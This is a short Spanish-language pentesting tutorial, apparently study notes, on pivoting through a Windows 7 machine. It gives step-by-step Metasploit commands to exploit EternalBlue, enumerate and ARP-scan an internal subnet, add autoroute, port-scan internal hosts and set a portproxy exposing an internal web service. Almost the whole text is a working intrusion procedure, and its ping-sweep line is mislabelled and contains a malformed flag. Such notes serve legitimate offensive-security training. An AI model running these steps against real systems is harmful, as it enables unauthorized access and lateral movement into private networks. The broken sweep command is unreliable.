# Pivoting en Windows 7

Cuando la máquina intermediaria es Windows, usamos módulos de Metasploit para el pivoting.

## 1. Comprometer Windows con EternalBlue

```bash
msfconsole
search eternalblue
use 0
show options
set RHOSTS <IP_windows>
run
```

## 2. Identificar Red Interna

En meterpreter:

```bash
ipconfig
```

Buscar una segunda interfaz de red (distinta a la nuestra) que indique una red interna.

## 3. Escanear Red Interna

```bash
use windows/gather/arp_scanner
set SESSION 1
set RHOSTS <subred.0>/24
run
```
### Ping Sweep con PowerShell

```powershell
for /L %i in (1,1,255) do @ping -n 1 -2 200 <red_objetivo>.%i > nul && echo <red_objetivo>.%i is up.
```

## 4. Configurar Autoroute

```bash
use multi/manage/autoroute
set SESSION 1
run
```

## 5. Escaneo de Puertos

```bash
use scanner/portscan/tcp
set RHOSTS <IP_maquina_interna>
run
```

## 6. Port Proxy (para Windows)

Redirige un puerto de la máquina interna a la máquina Windows (intermediaria). Esto permite acceder al servicio desde nuestra máquina usando la IP de Windows.

```bash
use post/windows/manage/portproxy
set CONNECT_ADDRESS <IP_maquina_interna>
set CONNECT_PORT 80
set LOCAL_ADDRESS 0.0.0.0
set LOCAL_PORT 5000
set SESSION 1
run
```

> Ahora podemos acceder al servicio web interno visitando `http://<IP_windows>:5000` desde nuestra máquina atacante.
